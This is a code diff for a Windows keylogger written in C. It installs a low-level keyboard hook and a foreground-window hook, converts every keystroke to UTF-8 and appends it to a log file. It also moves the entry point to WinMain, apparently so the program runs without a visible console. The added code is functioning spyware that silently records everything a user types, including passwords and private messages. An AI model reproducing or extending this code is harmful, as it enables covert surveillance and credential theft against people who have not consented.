@@ -1,5 +1,7 @@
 #include "winkey.h"
 #include <debugapi.h>
+#include <winbase.h>
+
 // add this line or add user32.lib on Makefile
 //#pragma comment(lib, "user32.lib")
 
@@ -15,70 +17,99 @@ typedef struct tagKBDLLHOOKSTRUCT {
 https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 */
 
+HWND LOG_FD = NULL;
+
+void CALLBACK win_foreground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
+	DWORD event, // Event type
+	HWND hwnd, // Handle to the window that generated the event
+	LONG idObject,	 // Object identifier
+	LONG idChild, // Child identifier
+	DWORD dwEventThread, // Thread identifier of the thread that generated the event
+	DWORD dwmsEventTime) // Time of the event in milliseconds since the system started
+{
+	UNREFERENCED_PARAMETER(hWinEventHook);
+	UNREFERENCED_PARAMETER(idObject);
+	UNREFERENCED_PARAMETER(idChild);
+	UNREFERENCED_PARAMETER(dwEventThread);
+	UNREFERENCED_PARAMETER(dwmsEventTime);
+
+	if (event == EVENT_SYSTEM_FOREGROUND)
+		_GetForegroundWindow(hwnd);
+}
+
 LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
 {
     KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
     DWORD   kCode = 0;
-
-    /*DWORD file = G etFileAttributes("C:\\Users\\r4mnesia\\Desktop\\log.txt");
-    if (file != INVALID_FILE_ATTRIBUTES)
-    {
-        // openfile 
-    }
-    else
-    {
-        // create file 
-    }*/
-
     if (wParam == WM_KEYDOWN)
     {
+        char inputLog[64];
         switch(pkey->vkCode)
         {
             case VK_SPACE:
-                input_add_string("[SPACE]");
+                sprintf_s(inputLog, sizeof(inputLog), "[SPACE]");
+				WriteToFile(inputLog);
                 break ;
             case VK_RETURN:
-                input_add_string("[ENTER]\\n\n");
-                DBG("buffer = %s\n", input_get_buffer());
-                WriteLogs(input_get_buffer());
-                input_clean_buffer();
+                sprintf_s(inputLog, sizeof(inputLog), "[ENTER]");
+				WriteToFile(inputLog);
                 break ;
             case VK_BACK:
-                input_add_string("[BACKSPACE]");
+                sprintf_s(inputLog, sizeof(inputLog), "[BACKSPACE]");
+				WriteToFile(inputLog);
                 break ;
             default:
                 kCode = pkey->vkCode;
-                printf("%c", (char)pkey->vkCode);
-                //DBG("OOHH\n");
-                
-                /* BYTE keyboard_status[256];
-                WCHAR unicode_buff[8] = {0}; 
-                int unicode = ToUnicode(pkey->vkCode, pkey->scanCode, keyboard_status, unicode_buff, 8, 0);
-                DBG("Unicde: %d\n", unicode);
-                DBG_unicode(L"%lc", unicode_buff[0]);*/
+				BYTE keyboardState[256];
+				GetKeyboardState(keyboardState);
 
-                input_add_key((char)pkey->vkCode);
-                DBG("buffer = %s\n", input_get_buffer());
-                //WriteLogs(input_get_buffer());
+				// Convert the virtual key code to a character
+				WCHAR unicodeBuffer[5];
+				int res = ToUnicode(kCode, pkey->scanCode, keyboardState, unicodeBuffer, 4, 0);
+
+				if (res > 0)
+				{
+					// Convert the wide character to UTF-8
+					unicodeBuffer[res] = L'\0';
+					char utf8Buffer[16];
+					int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
+					if (bytesWritten > 0)
+						WriteToFile(utf8Buffer);
+				}
                 break ;
         }
     }
 
-
     return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
-int main(void)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
-    HHOOK hhook = SetWindowsHookExA(
+    UNREFERENCED_PARAMETER(hInstance);
+    UNREFERENCED_PARAMETER(hPrevInstance);
+    UNREFERENCED_PARAMETER(lpCmdLine);
+    UNREFERENCED_PARAMETER(nShowCmd);
+
+    CreateLogFile();
+
+    HWINEVENTHOOK hook = SetWinEventHook(
+                            EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
+                            NULL,
+                            win_foreground,
+                            0, 0,
+                            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
+	if (hook == NULL)
+		return 1;
+
+    HHOOK hhook = SetWindowsHookExW(
                             WH_KEYBOARD_LL,
                             hook_proc,
                             NULL,
                             0);
 
     if (!hhook)
-        printf("Hook wasn't installed\n");
-    OutputDebugString("Hook was installed\n");
+        DBG("Hook wasn't installed\n");
+    DBG("Hook was installed\n");
 
     MSG msg;
     while(GetMessage(&msg, NULL, 0, 0) != 0)
@@ -87,5 +118,7 @@ int main(void)
         DispatchMessage(&msg);
     }
 
+	UnhookWinEvent(hook);
+	UnhookWindowsHookEx(hhook);
     return 0;
 }
